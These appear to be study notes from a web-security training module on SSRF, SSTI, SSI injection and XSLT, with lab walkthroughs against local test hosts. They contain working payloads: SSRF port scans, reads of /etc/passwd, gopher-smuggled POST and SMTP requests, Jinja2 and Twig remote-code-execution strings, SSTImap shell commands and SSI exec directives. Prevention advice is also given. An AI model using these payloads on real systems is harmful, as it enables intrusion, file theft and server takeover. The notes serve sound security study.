# Introduction
Server-side attacks target the application or service provided by a **server**, whereas a client-side attack takes place at the **client's machine**, not the server itself.

For instance, vulnerabilities like **Cross-Site Scripting (XSS)** target the web browser, i.e., the client. On the other hand, server-side attacks target the web server. We will go over four classes of server-side vulnerabilities:

- Server-Side Request Forgery (SSRF)
- Server-Side Template Injection (SSTI)
- Server-Side Includes (SSI) Injection
- eXtensible Stylesheet Language Transformations (XSLT) Server-Side Injection
## Server-Side Request Forgery (SSRF)
[Server-Side Request Forgery (SSRF)](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery) is a vulnerability where **an attacker can manipulate a web application into sending unauthorized requests from the server.** This vulnerability often occurs when an application makes **HTTP** requests to other servers based on **user input**. Successful exploitation of SSRF can enable an attacker to **access internal systems, bypass firewalls, and retrieve sensitive information.**

## Server-Side Template Injection (SSTI)
Web applications can utilize templating engines and server-side templates to generate responses such as **HTML** content dynamically. This generation is often based on user input, enabling the web application to respond to user input dynamically. When an attacker can inject template code, a [Server-Side Template Injection](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection) vulnerability can occur. SSTI can lead to various security risks, including **data leakage** and even **full server compromise via remote code execution**.

## Server-Side Includes (SSI) Injection
Similar to **server-side templates**, server-side includes (**SSI**) can be used to generate **HTML** responses dynamically. SSI directives instruct the webserver to include additional content dynamically. These directives are embedded into **HTML** files. For instance, **SSI** can be used to include content that is present in all **HTML** pages, such as headers or footers. When an attacker can inject commands into the **SSI** directives, [Server-Side Includes (SSI) Injection](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection) can occur. **SSI** injection can lead to **data leakage** or even **remote code execution**.

## eXtensible Stylesheet Language Transformations (XSLT) Server-Side Injection
**XSLT** server-side injection is a vulnerability that arises when an attacker can manipulate **XSLT transformations** performed on the server. **XSLT** is a language used to transform **XML** documents into other formats, such as **HTML**, and is commonly employed in web applications to generate content dynamically. In the context of **XSLT** server-side injection, attackers exploit weaknesses in how **XSLT** transformations are handled, allowing them to inject and execute **arbitrary code** on the server.

# SSRF
## Introduction to SSRF
This type of vulnerability occurs **when a web application fetches additional resources from a remote location based on user-supplied data, such as a URL.**

---
Suppose a web server fetches remote resources based on user input. In that case, an attacker might be able to coerce the server into making requests to arbitrary URLs supplied by the attacker, (i.e., the web server is vulnerable to SSRF)
While this might not sound particularly bad at first, depending on the web app's configuration, SSRF vulnerabilities can have devastating consequences.

Furthermore, if the web application relies on a **user-supplied URL** scheme or protocol, an attacker might be able to cause even further undesired behaviour by manipulating the URL scheme. For instance, the following URL schemes are commonly used in the exploitation of SSRF vulnerabilities:

- `http://` and `https://`: These **URL** schemes fetch content via **HTTP/S** requests. An attacker might use this in the exploitation of **SSRF** vulnerabilities to **bypass WAFs**, **access restricted endpoints, or access endpoints in the internal network**

- `file://`: This **URL** scheme **reads a file from the local file system**. An attacker might use this in the exploitation of **SSRF** vulnerabilities to read local files on the web server (**LFI**)

- `gopher://`: This protocol can send arbitrary bytes to the specified address. An attacker might use this in the exploitation of **SSRF** vulnerabilities to send **HTTP POST** requests with arbitrary payloads or communicate with other services such as SMTP servers or databases
## Identifying SSRF
Looking at the vulnerable web app, we are greeted with some generic text as well as functionality to schedule appointments:
![[Pasted image 20241215182051.png]]

After checking the availability of a date, we can observe the following request in **Burp**:
![[Pasted image 20241215182128.png]]The request contains our chosen date and a **URL** in the parameter `dateserver`. This indicates that the web server fetches the availability information from a separate system determined by the **URL** passed in this **POST** parameter.

To confirm an **SSRF** vulnerability, let us supply a **URL** pointing to our system to the web application:
![[Pasted image 20241215182215.png]]
In a `netcat` listener, we can receive a connection, thus confirming **SSRF**:
![[Pasted image 20241215182236.png]]

To determine whether the **HTTP** response reflects the **SSRF** response to us, let us point the web application to itself by providing the **URL** `http://127.0.0.1/index.php`:
![[Pasted image 20241215182349.png]]Since the response contains the web application's **HTML** code, the **SSRF** vulnerability is not blind, (i.e., the response is displayed to us).
## Enumerating the System
We can use the **SSRF** vulnerability to conduct a port scan of the system to enumerate running services. To achieve this, we need to be able to infer whether a port is open or not from the response to our **SSRF** payload. If we supply a port that we assume is closed (such as `81`), the response contains an error message:
![[Pasted image 20241215182514.png]]
This allows us to conduct an internal port scan of the web server through the **SSRF** vulnerability. We can do this using a fuzzer like `ffuf`. Let us first create a wordlist of the ports we want to scan. In this case, we'll use the first 10,000 ports:
```bash
seq 1 10000 > ports.txt
```

Now, we can fuzz all open ports by filtering out responses containing the error message:
```bash
ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
```
**Result:** 
```bash
[Status: 200, Size: 45, Words: 7, Lines: 1, Duration: 0ms]
    * FUZZ: 3306
[Status: 200, Size: 8285, Words: 2151, Lines: 158, Duration: 338ms]
    * FUZZ: 80
```
**Code explained**:
``` bash
-w ./ports.txt | "Tells the ffuf which wordlist to use"

-u http://172.17.0.2/index.php | "Specify the url to fuzz"

-X POST | "Specify the request type (e.g. POST or GET)"

-H "Content-Type: application/x-www-form-urlencoded" | "Apply header"

-d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" | "The data to send, the same line is in the burpsuite request"

-fr "Failed to connect to" | "Filter out responses containing this message"
```

The results show that the web server runs a service on port `3306`, typically used for a **SQL** database. If the web server ran other internal services, such as internal web applications, we could also identify and access them through the **SSRF** vulnerability.
## Exploiting SSRF
### Accessing Restricted Endpoints
The web application fetches availability information from the **URL** `dateserver.htb`. However, when we add this domain to our **hosts** file and attempt to access it, we are unable to do so:
![[Pasted image 20241216002352.png]]

However, we can access and enumerate the domain through the **SSRF** vulnerability. For instance, we can conduct a **directory brute-force** attack to enumerate additional endpoints using `ffuf`. To do so, let us first determine the web server's response when we access a non-existing page:
![[Pasted image 20241216002434.png]]
The web server responds with the default Apache **404** response. To also filter out any **HTTP 403** responses, we will filter our results based on the string `Server at dateserver.htb Port 80`, which is contained in default Apache error pages. Since the web application runs **PHP**, we will specify the `.php` extension:
```bash
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
```

> [!NOTE]
>  If you want to know the explanation of this code look at [[#Enumerating the System]].

The response should look something like:
```shell
[Status: 200, Size: 361, Words: 55, Lines: 16, Duration: 3872ms]
    * FUZZ: admin
[Status: 200, Size: 11, Words: 1, Lines: 1, Duration: 6ms]
    * FUZZ: availability
```
We have successfully identified an additional internal endpoints that we can now access through the **SSRF** vulnerability by specifying the URL `http://dateserver.htb/admin.php` in the `dateserver` **POST** parameter to potentially access sensitive admin information.
### Local File Inclusion (LFI) 
Since the **URL** scheme is part of the **URL** supplied to the web application, let us attempt to read **local files** from the file system using the `file://` **URL** scheme. We can achieve this by supplying the **URL** `file:///etc/passwd`:
![[Pasted image 20241216003144.png]]
We can use this to read arbitrary files on the filesystem, including the web app's source code. For more details LFI, check out the [File Inclusion](https://academy.hackthebox.com/module/details/23) module from HackTheBox.
###  The gopher Protocol
As we know, we can use **SSRF** to access **restricted internal endpoints**. However, we are restricted to **GET** requests as there is no way to send a **POST** request with the `http://` **URL** scheme. For instance, let us consider a different version of the previous web app. Assuming we identified the internal endpoint `/admin.php` just like before, however, this time the response looks like this:
![[Pasted image 20241216003516.png]]
As we can see, the admin endpoint is protected by a login prompt. From the **HTML** form, we can deduce that we need to send a **POST** request to `/admin.php` containing the password in the `adminpw` **POST** parameter. However, there is no way to send this **POST** request using the `http://` **URL** scheme.

Instead, we can use the [gopher](https://datatracker.ietf.org/doc/html/rfc1436) **URL** scheme to send arbitrary bytes to a **TCP socket**. This protocol enables us to create a **POST** request by building the **HTTP** request ourselves.

Assuming we want to try common weak passwords, such as `admin`, we can send the following **POST** request:
```http
POST /admin.php HTTP/1.1
Host: dateserver.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin
```

We need to **URL-encode** all special characters to construct a valid **gopher URL** from this. In particular, spaces (`%20`) and newlines (`%0D%0A`) must be **URL-encoded**. Afterward, we need to prefix the data with the **gopher** **URL** scheme, the **target host and port**, and an **underscore**, resulting in the following **gopher** **URL** :
```gopher
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```
Our specified bytes are sent to the **target** when the web app processes this URL. Since we carefully chose the bytes to represent a valid **POST** request, the internal web server accepts our **POST** request and responds accordingly. However, since we are sending our **URL** within the **HTTP POST** parameter `dateserver`, which itself is **URL-encoded**, we need to **URL-encode** the entire **URL** again to ensure the correct format of the **URL** after the web server accepts it. Otherwise, we will get a `Malformed URL` error. After **URL encoding** the entire **gopher URL** one more time, we can finally send the following request:
```http
POST /index.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 265
Content-Type: application/x-www-form-urlencoded

dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
```
We can use the `gopher` to interact with many internal services, not just **HTTP** servers. Imagine a scenario where we identify, through an **SSRF** vulnerability, that **TCP port 25** is open locally. This is the standard port for **SMTP** servers. We can use **gopher** to interact with this internal **SMTP** server as well. However, constructing syntactically and semantically correct **gopher URL**s can take time and effort. Thus, we will utilize the tool [Gopherus](https://github.com/tarunkant/Gopherus) to generate **gopher URL**s for us. The following services are supported:
- MySQL
- PostgreSQL
- FastCGI
- Redis
- SMTP
- Zabbix
- pymemcache
- rbmemcache
- phpmemcache
- dmpmemcache
To run the tool, we need a valid **Python2** installation. Afterward, we can run the tool by executing the Python script downloaded from the GitHub repository:
```bash
$ python2.7 gopherus.py

  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

                author: $_SpyD3r_$

usage: gopherus.py [-h] [--exploit EXPLOIT]

optional arguments:
  -h, --help         show this help message and exit
  --exploit EXPLOIT  mysql, postgresql, fastcgi, redis, smtp, zabbix,
                     pymemcache, rbmemcache, phpmemcache, dmpmemcache
```
Let us generate a valid **SMTP URL** by supplying the corresponding argument. The tool asks us to input details about the **email** we intend to send. Afterward, we are given a valid gopher URL that we can use in our **SSRF** exploitation:
```bash
$ python2.7 gopherus.py --exploit smtp
..SNIP..
Give Details to send mail: 

Mail from :  attacker@academy.htb
Mail To :  victim@academy.htb
Subject :  HelloWorld
Message :  Hello from SSRF!

Your gopher link is ready to send Mail: 

gopher://127.0.0.1:25/_MAIL%20FROM:attacker%40academy.htb%0ARCPT%20To:victim%40academy.htb%0ADATA%0AFrom:attacker%40academy.htb%0ASubject:HelloWorld%0AMessage:Hello%20from%20SSRF%21%0A.

-----------Made-by-SpyD3r-----------
```

---
## Blind SSRF
In many real-world **SSRF** vulnerabilities, the response is not directly displayed to us. These instances are called **blind SSRF** vulnerabilities **because we cannot see the response**. As such, all of the exploitation vectors discussed in the previous sections are unavailable to us because they all rely on us being able to inspect the response. Therefore, the impact of **blind SSRF** is generally significantly lower due to the severely restricted exploitation vectors.
### Identifying Blind SSRF
The sample web app behaves just like previously. We can confirm the **SSRF** vulnerability just like we did before by supplying a **URL** to a system under our control and setting up a `netcat` listener:
```bash
$ nc -nvlp 8000
```
However, if we attempt to point the web app to itself, we can see that the response does not contain the **HTML** response of the coerced request; instead, it simply lets us know that the date is unavailable. Therefore, this is a **blind SSRF** vulnerability:
![kuva](https://hackmd.io/_uploads/Syu19KaEJe.png)

### Exploiting Blind SSRF
Exploiting **blind SSRF** is generally severely limited compared to **non-blind SSRF**. However, depending on the web app's behavior, we might still be able to conduct a (restricted) local port scan of the system, provided the response differs for open and closed ports. In this case, the web app responds with `Something went wrong!` for closed ports:
![kuva](https://hackmd.io/_uploads/BkNFqYaVke.png)

However, if a port is open and responds with a valid HTTP response, we get a different error message:
![kuva](https://hackmd.io/_uploads/rk79htp4kl.png)

Depending on how the web app catches unexpected errors, we might be unable to identify running services that do not respond with valid **HTTP** responses. For instance, we are unable to identify the running **MySQL service** using this technique:
![kuva](https://hackmd.io/_uploads/S1oR2Y6VJx.png)

Furthermore, while we **cannot** read local files like before, we can use the **same technique** to identify existing files on the filesystem. That is because the error message is different for existing and non-existing files, **just like it differs for open and closed ports**:
![kuva](https://hackmd.io/_uploads/rJ9ZTtp4yg.png)

For invalid files, the error message is different:
![kuva](https://hackmd.io/_uploads/ByWSptaNJg.png)

### Prevention
**Application Layer Mitigations:**
* Use a whitelist to validate remote origins and prevent arbitrary requests.
* Restrict URL schemes and protocols, either by hardcoding or using a whitelist.
* Apply input sanitization to prevent unexpected behavior.

**Network Layer Mitigations:**
* Implement firewall rules to block outgoing requests to unauthorized systems.
* Use network segmentation to limit access to internal systems.

# SSTI
## Template Engines
A template engine is software that combines pre-defined templates with dynamically generated data and is often used by web apps to generate dynamic responses. An everyday use case for template engines is a website with shared headers and footers for all pages. A template can dynamically add content but keep the header and footer the same. This avoids duplicate instances of header and footer in different places, reducing complexity and thus enabling better code maintainability. Popular examples of template engines are **Jinja** and **Twig**.
![Template-system](https://hackmd.io/_uploads/ryw2l9641l.png)

### Templating
Template engines typically require two inputs: **a template and a set of values to be inserted into the template**. The template can typically be provided as a string or a file and contains pre-defined places where the template engine inserts the dynamically generated values.
The values are provided as key-value pairs so the template engine can place the provided value at the location in the template marked with the corresponding key. Generating a string from the input template and input values is called **rendering**.

The template syntax depends on the concrete template engine used. For example, we will use the syntax used by the **Jinja template engine** throughout this section. Consider the following template string:
````jinja2
Hello {{ name }}!
````
It contains a single variable called `name`, which is replaced with a **dynamic value** during rendering. When the template is rendered, the template engine must be provided with a value for the variable name. For instance, if we provide the variable `name="vautia"` to the rendering function, it will generate the following string:
`Hello vautia!`
The template engine simply replaces the **variable** in the template with the **dynamic value** provided to the rendering function.

While the above is a simplistic example, many modern template engines support more complex operations typically provided by programming languages, such as **conditions** and **loops**. For instance, consider the following template string:
```jinja2
{% for name in names %}
Hello {{ name }}!
{% endfor %}    
```
The template contains a **for-loop** that loops over all elements in a variable names. As such, we need to provide the rendering function with an object in the names variable that it can iterate over. For instance, if we pass the function with a **list** such as `names=["vautia", "21y4d", "Pedant"]`, the template engine will generate the following string:
```
Hello vautia!
Hello 21y4d!
Hello Pedant!
```
## Introduction to SSTI
As the name suggests, **Server-side Template Injection (SSTI)** occurs when an attacker can inject templating code into a template that is later rendered by the server. If an attacker injects malicious code, the server potentially executes the code during the rendering process, **enabling an attacker to take over the server completely**.

### Server-side Template Injection Explained
The rendering of templates inherently deals with dynamic values provided to the template engine during rendering. Often, these dynamic values are provided by the user. 
However, template engines can deal with user input securely if provided as values to the rendering function. That is because template engines insert the values into the corresponding places in the template and do not run any code within the values.
**On the other hand, SSTI occurs when an attacker can control the template parameter, as template engines run the code provided in the template.**

If templating is implemented correctly, user input is **always** provided to the rendering function in values and never in the template string. However, **SSTI** can occur when user input is inserted into the template **before** the rendering function is called on the template.

A different instance would be if a web app calls the rendering function on the same template multiple times. If user input is inserted into the output of the first rendering process, it would be considered part of the template string in the second rendering process, potentially resulting in **SSTI**. 

Lastly, web applications enabling users to modify or submit existing templates result in an obvious SSTI vulnerability.

## Identifying SSTI
We need to identify the template engine the target web app uses, as the exploitation process **highly** depends **on the concrete template engine in use**. That is because each template engine uses a slightly different syntax and supports different functions we can use for exploitation purposes.
### Confirming SSTI
The process of identifying an **SSTI vulnerability** is similar to the process of identifying any other injection vulnerability (i.e. **SQL Injection**). 

The most effective way is to **inject special characters with semantic meaning in template engines and observe the web application's behavior**.

As such, the following test string is commonly used to provoke an error message in a web app vulnerable to **SSTI**, as it consists of all special characters that have a particular semantic purpose in popular template engines:
`
${{<%[%'"}}%\.
`
Since the above test string should almost certainly violate the template syntax, **it should result in an error if the web application is vulnerable to SSTI**. This behavior is similar to how injecting a single quote **(')** into a web app vulnerable to SQL injection can break an SQL query's syntax.

As a practical example, let us look at our sample web app. We can insert a name, which is then reflected on the following page:
![kuva](https://hackmd.io/_uploads/HJmhO9a4kl.png)
![kuva](https://hackmd.io/_uploads/rylpd9p4yl.png)

To test for an **SSTI** vulnerability, we can inject the above test string (`${{<%[%'"}}%\.`). This results in the following response from the web app:
![kuva](https://hackmd.io/_uploads/Sy60dq6E1e.png)
As we can see, the web application throws an error. While this does not confirm that the web application is vulnerable to **SSTI**, it should increase our suspicion that the parameter might be vulnerable.

### Identifying the Template Engine
To do a successful exploitation of an **SSTI**, we first need to determine the template engine used by the web app. We can utilize slight variations in the behavior of different template engines to achieve this. 

For instance, consider the following commonly used overview containing slight differences in popular template engines:
![kuva](https://hackmd.io/_uploads/SyLEY5pEJg.png)
<sup>Image taken from [HackTheBox](https://hackthebox.com)</sup>
We will start by injecting the payload `${7*7}` and follow the diagram from **left to right**, depending on the result of the injection. 

Suppose the injection resulted in a successful execution of the injected payload. In that case, we follow the green arrow; otherwise, we follow the red arrow.

Injecting the payload `${7*7}` into our sample web app results in the following behavior:
![kuva](https://hackmd.io/_uploads/HytD59aNyl.png)

Since the injected payload was not executed, we follow the red arrow and now inject the payload `{{7*7}}`:
![kuva](https://hackmd.io/_uploads/BJMF9cpNJl.png)

This time, the payload was executed by the template engine. Therefore, we follow the green arrow and inject the payload `{{7*'7'}}`.
In **Jinja**, the result will be `7777777`, while in **Twig**, the result will be `49`.

## Exploiting SSTI - Jinja2
Now that we identified a web app vulnerable to **SSTI**, we will move on to the exploitation of **SSTI**. We will assume that the web app uses the **Jinja template engine**. We will only focus on the **SSTI exploitation and thus assume that the SSTI confirmation and template engine identification have already been done in a previous step**.

**Jinja** is a template engine commonly used in **Python web frameworks** such as **Flask** or **Django**. This section will focus on a **Flask** web app. The payloads in other web frameworks might be slightly different.

In our payload, **we can freely use any libraries that are already imported by the Python app**, either **directly** or **indirectly**.
Additionally, we may be able to import additional libraries through the use of the **import** statement.
### Information Disclosure
We can exploit the **SSTI** vulnerability to obtain **internal information** about the web app, including configuration details and the web app's source code.

For instance, we can obtain the web app's configuration using the following **SSTI** payload:
```jinja2
{{ config.items() }}
```
![kuva](https://hackmd.io/_uploads/BJYt7ia4kl.png)

Since this payload dumps the entire web app configuration, including any used secret keys, we can prepare **further attacks** using the obtained information. We can also execute **Python code** to obtain information about the web app's source code. We can use the following **SSTI** payload to dump all available built-in functions:
```jinja2   
{{ self.__init__.__globals__.__builtins__ }}
```
![kuva](https://hackmd.io/_uploads/r17a7sTE1e.png)
### Local File Inclusion (LFI)
We can use Python's built-in function `open` to include a local file. However, we cannot call the function directly; we need to call it from the `__builtins__` dictionary we dumped earlier. This results in the following payload to include the file `/etc/passwd`:
```jinja2
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```
![kuva](https://hackmd.io/_uploads/Syfn4ipEJg.png)

### Remote Code Execution (RCE)
To achieve remote code execution in Python, we can use functions provided by the ``os`` library, such as ``system`` or ``popen``.
However, if the web app has not already imported this library, we must first import it by calling the built-in function ``import``. This results in the following **SSTI** payload:
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
![kuva](https://hackmd.io/_uploads/SyjBLoTE1e.png)



## Exploiting SSTI - Twig
This section will discuss exploiting **SSTI** in the **Twig** template engine. Like in the previous section, we will only focus on the **SSTI** exploitation and thus assume that the **SSTI** confirmation and template engine identification have already been done in a previous step. 
**Twig is a template engine for the PHP programming language.**
### Information Disclosure
In Twig, we can use the `_self` keyword to obtain a little information about the current template:
```twig
{{ _self }}
```
![kuva](https://hackmd.io/_uploads/HJKx9oT4yg.png)
However, as we can see, the amount of information is limited compared to **Jinja**.
### Local File Inclusion (LFI)
Reading local files (without using the same way as we will use for **RCE**) is not possible using internal functions directly provided by **Twig**. However, the **PHP** web framework [Symfony](https://symfony.com/) defines additional **Twig** filters. One of these filters is [file_excerpt](https://symfony.com/doc/current/reference/twig_reference.html#file-excerpt) and can be used to read local files:
```twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```
![kuva](https://hackmd.io/_uploads/BJXNsipVJg.png)
### Remote Code Execution (RCE)
To achieve RCE, we can use a **PHP** built-in function such as ``system``. We can pass an argument to this function by using Twig's ``filter`` function, resulting in any of the following **SSTI** payloads:
```twig
{{ ['id'] | filter('system') }}
```
![kuva](https://hackmd.io/_uploads/ry-GK06E1l.png)
External SSTI Cheat Sheet: [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
## SSTI Tools of the Trade
The most popular tool for identifying and exploiting **SSTI** vulnerabilities is [tplmap](https://github.com/epinna/tplmap). **However, tplmap is not maintained anymore and runs on the deprecated Python2 version.** Therefore, we will use the more modern [SSTImap](https://github.com/vladko312/SSTImap) to aid the **SSTI** exploitation process. We can run it after cloning the repository and installing the required dependencies:
```bash
$ git clone https://github.com/vladko312/SSTImap
$ cd SSTImap
$ pip3 install -r requirements.txt
$ python3 sstimap.py
-----------------------
    ╔══════╦══════╦═══════╗ ▀█▀
    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
    ║ ╚════╣ ╚════╗ ║ ║ ║{║ _ __ ___ __ _ _ __
    ╚════╗ ╠════╗ ║ ║ ║ ║*║ | '_ ` _ \ / _` | '_ \
    ╔════╝ ╠════╝ ║ ║ ║ ║}║ | | | | | | (_| | |_) |
    ╚══════╩══════╝ ╚═╝ ╚╦╝ |_| |_| |_|\__,_| .__/
                             │ | |
                                                |_|
[*] Version: 1.2.0
[*] Author: @vladko312
[*] Based on Tplmap
[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal.
It is the end user's responsibility to obey all applicable local, state, and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] Loaded plugins by categories: languages: 5; engines: 17; legacy_engines: 2
[*] Loaded request body types: 4
[-] SSTImap requires target URL (-u, --url), URLs/forms file (--load-urls / --load-forms) or interactive mode (-i, --interactive)
```
To automatically identify any **SSTI** vulnerabilities as well as the template engine used by the web app, we need to provide **SSTImap** with the target **URL**:
```bash
$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test
- - - - - - - -
SNIPPED (For visibility)
[+] SSTImap identified the following injection point:

  Query parameter: name
  Engine: Twig
  Injection: *
  Context: text
  OS: Linux
  Technique: render
  Capabilities:
    Shell command execution: ok
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: ok, php code
```
As we can see, **SSTImap** confirms the **SSTI** vulnerability and successfully identifies the `Twig` template engine. It also provides capabilities we can use during exploitation. For instance, we can download a remote file to our local machine using the `-D` flag:
```bash
$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'
- - - - - -
[+] File downloaded correctly
```
Additionally, we can execute a **system** command using the `-S` flag:
```bash
$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
- - - - - -
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Alternatively, we can use `--os-shell` to obtain an **interactive shell**:
```bash
$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
- - - - - - 
[+] Run commands on the operating system.
Linux $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Linux $ whoami
www-data
```
## Preventing SSTI
1. **Prevent SSTI Vulnerabilities**:
- Ensure user input is never fed directly into the template engine’s rendering function.
- Review all code paths to guarantee user input isn’t used in template parameters.
- If users can modify or upload templates, ensure proper security measures are in place.
- Harden the template engine to prevent attacks.

2. **Remove Dangerous Functions**:
- Disable potentially dangerous functions in the template engine to prevent remote code execution (RCE).
- Be aware that removing dangerous functions may still leave room for bypasses.

3. **Separate Execution Environment**:
- Isolate the template engine in a separate execution environment (e.g., Docker container).
- This minimizes the risk of compromising the web server and provides stronger security.
# SSI 
## Introduction to SSI
**Server-Side Includes** (**SSI**) is a technology web apps use to create dynamic content on **HTML** pages. **SSI** is supported by many popular web servers such as [Apache](https://httpd.apache.org/docs/current/howto/ssi.html) and [IIS](https://learn.microsoft.com/en-us/iis/configuration/system.webserver/serversideinclude). The use of **SSI** can often be inferred from the **file extension**.

Typical file extensions include `.shtml`, `.shtm`, and `.stm`. However, web servers can be configured to support **SSI** directives in arbitrary file extensions. As such, we cannot conclusively conclude whether **SSI** is used only from the file extension.
### SSI Directives
**SSI** utilizes `directives` to add dynamically generated content to a static **HTML** page. These directives consist of the following components:
- `name`: the directive's name
- `parameter name`: one or more parameters
- `value`: one or more parameter values
An **SSI directive** has the following syntax:
```SSI
<!--#name param1="value1" param2="value" -->
```

For instance, the following are some **common SSI directives**:
#### printenv
This directive **prints environment variables**. It does not take any variables.
```SSI
<!--#printenv -->
```
#### config
This directive changes the **SSI configuration** by specifying corresponding parameters. For instance, it can be used to change the error message using the `errmsg` parameter:
```SSI
<!--#config errmsg="Error!" -->
```
#### echo
This directive **prints** the value of any variable given in the `var` parameter. Multiple variables can be printed by specifying multiple `var` parameters. For instance, the following variables are supported:
```SSI
<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->
```
#### exec
This directive executes the command given in the `cmd` parameter:
```SSI
<!--#exec cmd="whoami" -->
```
#### include
This directive includes the file specified in the `virtual` parameter. It only allows for the inclusion of files in the **web root directory**:
```SSI
<!--#include virtual="index.html" -->
```
### SSI Injection
Occurs when an attacker can inject **SSI directives** into a file that is subsequently served by the web server, resulting in the **execution** of the injected **SSI directives**. For instance, when the web app contains a **vulnerable file upload vulnerability** that enables an attacker to upload a file containing malicious **SSI directives** into the web root directory. Additionally, attackers might be able to inject **SSI directives** if a web app writes user input to a file in the web root directory.
## Exploiting SSI Injection
Let's take a look at a sample web app. We are greeted by a simple form asking for our name:
![[Pasted image 20241216191635.png]]
If we enter our **name**, we are redirected to `/page.shtml`, which displays some general information:
![[Pasted image 20241216191701.png]]
We can guess that the page supports **SSI** based on the **file extension**. If our username is inserted into the page without prior sanitization, it might be vulnerable to **SSI** injection. Let us confirm this by providing a username of `<!--#printenv -->`. This results in the following page:
![[Pasted image 20241216191741.png]]
As we can see, the directive **is executed**, and the environment variables are printed. Thus, we have successfully confirmed an **SSI** injection vulnerability. Let us confirm that we can execute arbitrary commands using the `exec` directive by providing the following username: `<!--#exec cmd="id" -->`:
![[Pasted image 20241216191813.png]]
The server successfully executed our injected command. This enables us to take over the web server fully.
## Preventing SSI
SSI injection can result in devastating consequences, including **remote code execution** and, thus, takeover of the web server.

As with any injection vulnerability, developers must carefully **validate and sanitize user input** to prevent **SSI injection**. This is particularly important when the user input is used within **SSI directives** or **written to files that may contain SSI directives** according to the web server configuration. 
Additionally, it is vital to configure the webserver to restrict the use of **SSI** to particular file extensions and potentially even particular directories. On top of that, the capabilities of specific **SSI** directives can be limited to help mitigate the impact of **SSI** injection vulnerabilities. For instance, it might be possible to turn off the `exec` directive if it is not actively required.
# XSLT
## Introduction to XSLT 
[eXtensible Stylesheet Language Transformation](https://www.w3.org/TR/xslt-30/) is a language enabling the transformation of **XML** documents. For instance, it can select specific nodes from an **XML** document and change the **XML** structure.

Since **XSLT** operates on **XML-based** data, we will consider the following sample **XML** document to explore how **XSLT** operates:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<fruits>
    <fruit>
        <name>Apple</name>
        <color>Red</color>
        <size>Medium</size>
    </fruit>
    <fruit>
        <name>Banana</name>
        <color>Yellow</color>
        <size>Medium</size>
    </fruit>
    <fruit>
        <name>Strawberry</name>
        <color>Red</color>
        <size>Small</size>
    </fruit>
</fruits>
```

**XSLT** can be used to define a data format which is subsequently enriched with data from the **XML** document. **XSLT** data is structured similarly to **XML**. However, it contains **XSL** elements within nodes prefixed with the `xsl`-prefix. The following are some commonly used **XSL** elements:
- `<xsl:template>`: This element indicates an XSL template. It can contain a `match` attribute that contains a path in the XML document that the template applies to
- `<xsl:value-of>`: This element extracts the value of the XML node specified in the `select` attribute
- `<xsl:for-each>`: This element enables looping over all XML nodes specified in the `select` attribute
For instance, a simple **XSLT** document used to output **all fruits** contained within the **XML** document as well as **their colour**, may look like this:
```xml (XSLT)
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
	<xsl:template match="/fruits">
		Here are all the fruits:
		<xsl:for-each select="fruit">
			<xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
		</xsl:for-each>
	</xsl:template>
</xsl:stylesheet>
```
As we can see, the **XSLT** document contains a single `<xsl:template>` **XSL element** that is applied to the `<fruits>` node in the **XML** document. 
The template consists of the static string `Here are all the fruits:` and a loop over all `<fruit>` nodes in the **XML** document. 
For each of these nodes, the values of the `<name>` and `<color>` nodes are printed using the `<xsl:value-of>` **XSL element**. Combining the sample **XML** document with the above **XSLT** data results in the following output:
```
Here are all the fruits:
    Apple (Red)
    Banana (Yellow)
    Strawberry (Red)
```
Here are some additional **XSL elements** that can be used to narrow down further or customize the data from an **XML document**:
- `<xsl:sort>`: This element specifies how to sort elements in a for loop in the `select` argument. Additionally, a sort order may be specified in the `order` argument
- `<xsl:if>`: This element can be used to test for conditions on a node. The condition is specified in the `test` argument.
